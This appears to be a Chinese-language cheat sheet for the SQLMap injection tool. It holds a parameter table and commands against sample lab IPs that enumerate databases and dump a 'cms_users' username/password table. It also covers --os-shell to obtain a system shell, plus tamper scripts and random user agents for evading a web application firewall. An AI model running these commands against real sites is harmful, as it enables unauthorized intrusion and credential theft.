# [SQLMap](https://github.com/sqlmapproject/sqlmap.git)

<!--last modify: 20230816-->

SQLMap 是一款专注于SQLi 的工具，SQLmap 基于Python 语言编写的命令行工具，集成在Kali 中

## 0x00 基本参数

| 参数                      | 含义                                    |
| ------------------------- | --------------------------------------- |
| -u                        | 检测注入点                              |
| --dbs                     | 列出所有的库名                          |
| --current-user            | 当前连接数据库用户的名字                |
| --current-db              | 当前数据库的名字                        |
| -D "cms"                  | 指定目标数据库为cms                     |
| --tables                  | 列出数据库中所有的表名                  |
| -T "cms_users"            | 指定目标表名为'cms_users'               |
| --columns                 | 列出所有的字段名                        |
| -C “username,password”    | 指定目标字段                            |
| --dump                    | 列出字段内容                            |
| -r                        | 从文件中读取HTTP 请求                   |
| --os-shell                | 在特定情况下，可以直接获得目标系统Shell |
| --level 3                 | 设置sqlmap 检测等级 3                   |
| --cookie="username=admin" | 携带Cookie 信息进行注入                 |
| -g                        | 利用google 搜索引擎自动搜索注入点       |
| --batch                   | 使用默认选项                            |
| --random-agent            | 使用随机User-Agent 信息                 |
| -v 3                      | 显示payload                             |
| --param-filter=Referer    | 指定注入参数                            |
| --tamper “space2comment”  | 使用tamper脚本处理注入payload           |
| --dbms=MYSQL              | 指定数据库为MYSQL                       |

## 0x01 基本命令

```cmd
注入点：http://10.10.10.6/cms/show.php?id=33
sqlmap -u "http://10.10.10.1/show.php?id=33"
sqlmap -u "http://10.10.10.1/show.php?id=33" --dbs
sqlmap -u "http://10.10.10.1/show.php?id=33" --current-db
sqlmap -u "http://10.10.10.1/show.php?id=33" -D "cms" --tables
sqlmap -u "http://10.10.10.1/show.php?id=33" -D "cms" -T "cms_users" --columns
sqlmap -u "http://10.10.10.1/show.php?id=33" -D "cms" -T "cms_users" -C "username,password" --dump

```

### 0x01x000 POST 注入

- 受到secure_file_priv 选项的限制；

- 目标系统Web 根目录的绝对路径；

  ```cmd
  sqlmap -r /tmp/login.post
  ```

- 直接 getshell

  ```cmd
  sqlmap -u "http://192.168.16.119/show.php?id=33" --os-shell
  ```

## 0x02 SQLMap 自动绕狗

将 SQLMap 源码放到 python 根目录下的 temper (绕狗脚本)
